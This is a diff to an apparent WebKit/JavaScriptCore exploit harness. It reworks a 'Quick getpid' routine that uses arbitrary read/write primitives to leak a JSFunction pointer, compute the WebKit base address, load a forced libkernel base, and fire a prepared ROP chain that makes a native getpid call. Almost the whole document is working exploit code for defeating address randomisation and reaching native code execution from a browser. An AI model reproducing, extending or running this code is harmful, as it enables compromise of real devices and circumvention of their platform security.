@@ -41,10 +41,10 @@ import {
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepNativeChain, stageGetpid, fireGetpid, runGetpidFromPrep } from "./native_call.js";
+import { prepNativeChain, runGetpidFromPrep } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830a";
+const BUILD_ID = "rw-20250830b";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -204,10 +204,9 @@ function setUi() {
         btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
     }
     if (btnNative) {
-        btnNative.disabled = busy || !ready || !nativeAllowed || !pivotReady;
-        btnNative.title = nativeStaged
-            ? "tap again to fire getpid (Math.expm1)"
-            : "tap 1=stage ROP, tap 2=fire getpid — or Force lk then Save bases";
+        btnNative.disabled = busy || !ready || !nativeAllowed;
+        btnNative.textContent = "Quick getpid";
+        btnNative.title = "Start → Force lk → Quick getpid (skip Verify pivot)";
     }
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
@@ -566,35 +565,8 @@ function saveBasesManual() {
             : resolveWebkitBase(off, nativeFn);
         if (webkitBase) {
             try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
-            try {
-                nativePrep = prepNativeChain(p, off, webkitBase);
-                mark("SAVE-PREP", "native buffers cached — getpid needs no leakval");
-            } catch (err) {
-                nativePrep = null;
-                mark("SAVE-WARN", "native prep failed: " + (err.message || err));
-            }
             mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
-            const lk = loadForcedLibkernel();
-            if (lk && nativePrep) {
-                try {
-                    nativeStaged = false;
-                    const pid = runGetpidFromPrep(p, nativePrep, lk, off);
-                    if (pid > 0) {
-                        mark("NATIVE-OK", "getpid=" + pid + " (inline Save+getpid)");
-                        state("getpid OK pid=" + pid, "ok");
-                        crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
-                        crashLog.flushSync();
-                    } else {
-                        mark("NATIVE-FAIL", "inline getpid=" + pid + " — tap Native x2");
-                        state("tap Native twice", "warn");
-                    }
-                } catch (err) {
-                    mark("NATIVE-FAIL", "inline: " + (err.message || err));
-                    state("tap Native twice", "warn");
-                }
-            } else if (!lk) {
-                mark("SAVE-HINT", "Force lk then Save bases again for inline getpid");
-            }
+            mark("SAVE-HINT", "Force lk done? tap Quick getpid — skip Verify pivot");
         } else {
             mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
         }
@@ -1710,8 +1682,8 @@ function verifyPivotManual() {
         mark("PIVOT-OK", v.good.join(", "));
     pivotReady = v.ok;
     if (v.ok) {
-        mark("PIVOT-READY", v.count + "/" + v.total + " — Native call unlocked");
-        state("pivot chain OK — Native call enabled", "ok");
+        mark("PIVOT-READY", v.count + "/" + v.total + " (optional — Quick getpid skips this)");
+        state("pivot OK — optional", "ok");
     } else {
         state("pivot not ready — " + pivotNotReadyMsg(v), "warn");
     }
@@ -2104,73 +2076,69 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-async function doNativeCallImmediate() {
-    if (!nativeAllowed) {
-        mark("NATIVE-FAIL", "window.p broken — reload");
-        state("native blocked", "bad");
-        return;
-    }
+function runQuickGetpid() {
+    if (busy || !ready || !window.p || !nativeAllowed) return;
     const p = window.p;
-    if (!p) throw new Error("window.p missing");
-
     const off = loadEffectiveOff();
-    const { webkitBase } = basesFromSession(off);
-    if (!webkitBase) {
-        mark("NATIVE-FAIL", "no webkitBase — Save bases first");
-        state("need webkit base", "bad");
-        return;
-    }
-    const libkernelBase = loadForcedLibkernel()
-        || parseAddr(String(sessionStorage.getItem("wk-libkernelBase") || "").replace(/^0x/i, ""));
-    if (!libkernelBase) {
-        mark("NATIVE-FAIL", "Force lk first");
+    const lk = loadForcedLibkernel()
+        || (addrIn && addrIn.value
+            ? parseAddr(String(addrIn.value).replace(/^0x/i, "")) : null);
+    if (!lk) {
+        mark("NATIVE-SKIP", "Force lk first — Load cal ptr → hex → Force lk");
         state("Force lk first", "bad");
         return;
     }
-    if (!nativePrep) {
-        mark("NATIVE-FAIL", "Save bases first (1-slab prep)");
-        state("Save bases first", "bad");
-        return;
-    }
-    if (lines.length > 10) lines.splice(0, lines.length - 10);
-    if (outEl) outEl.textContent = lines.join("\n");
 
-    if (!nativeStaged) {
-        try {
-            stageGetpid(p, nativePrep, libkernelBase, off);
-            nativeStaged = true;
-            lines.push("NATIVE-STAGE  layout+arm OK — tap Native again to fire");
-            if (outEl) outEl.textContent = lines.join("\n");
-            state("tap Native again (fire getpid)", "warn");
-        } catch (err) {
-            nativeStaged = false;
-            throw err;
-        }
-        return;
-    }
+    busy = true;
+    setUi();
+    nativeQuiet = true;
+    lkQuiet = true;
+    retained.length = 0;
+    pointers.length = 0;
+    lines.length = 0;
+    if (outEl) outEl.textContent = "Quick getpid…";
 
-    nativeStaged = false;
-    lines.push("NATIVE-FIRE  getpid… build=" + BUILD_ID);
-    if (outEl) outEl.textContent = lines.join("\n");
     let pid = -1;
+    let errMsg = null;
     try {
-        pid = fireGetpid(p, nativePrep);
+        const cell = p.leakval(Math.expm1);
+        const nativeFn = p.read8(p.read8(cell.add32(0x18))
+            .add32(off.wk_JSFunction_m_function || 0x28));
+        if (!nativeFn) throw new Error("nativeFn capture failed");
+        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        try {
+            sessionStorage.setItem("wk-nativeFn", String(nativeFn));
+            sessionStorage.setItem("wk-webkitBase", String(webkitBase));
+        } catch (_) { }
+        nativePrep = prepNativeChain(p, off, webkitBase);
+        pid = runGetpidFromPrep(p, nativePrep, lk, off);
     } catch (err) {
-        mark("NATIVE-FAIL", String(err.message || err));
-        state("getpid error", "bad");
-        renderOut();
-        return;
+        errMsg = err.message || String(err);
     }
+
+    nativeQuiet = false;
+    lkQuiet = false;
+    lines.length = 0;
     if (pid > 0) {
-        mark("NATIVE-OK", "getpid=" + pid);
+        lines.push("NATIVE-OK  getpid=" + pid + " build=" + BUILD_ID);
         state("getpid OK pid=" + pid, "ok");
-        crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
+        try {
+            saveLibkernelSession(lk, null, { forced: true });
+            crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
+            crashLog.flushSync();
+        } catch (_) { }
     } else {
-        mark("NATIVE-FAIL", "getpid=" + pid);
-        state("getpid <=0 — wrong lk base?", "bad");
+        lines.push("NATIVE-FAIL  " + (errMsg || "getpid=" + pid) + " build=" + BUILD_ID);
+        state("getpid failed", "bad");
     }
-    renderOut();
-    crashLog.flushSync();
+    if (outEl) outEl.textContent = lines.join("\n");
+    pivotReady = true;
+    busy = false;
+    setUi();
+}
+
+async function doNativeCallImmediate() {
+    runQuickGetpid();
 }
 
 async function freeBeforeNative() {
@@ -2213,22 +2181,7 @@ async function runRwProofManual() {
 
 async function runNativeCall() {
     if (busy || !ready || !window.p) return;
-    busy = true;
-    setUi();
-    try {
-        await freeBeforeNative();
-        await doNativeCallImmediate();
-    } catch (err) {
-        if (nativeChain) {
-            try { nativeChain.disarm(); } catch (_) { }
-            nativeChain = null;
-        }
-        mark("NATIVE-FAIL", err.message || String(err));
-        state("native call failed", "bad");
-    } finally {
-        busy = false;
-        setUi();
-    }
+    runQuickGetpid();
 }
 
 async function loadExploit() {
@@ -2403,6 +2356,8 @@ async function runStart() {
 
         nativeAllowed = pairStatus.state !== "broken";
         mark("PRIMITIVE-OK", "arb rw live");
+        pivotReady = true;
+        mark("HINT", "Force lk → Quick getpid — do NOT Verify pivot first (OOM)");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
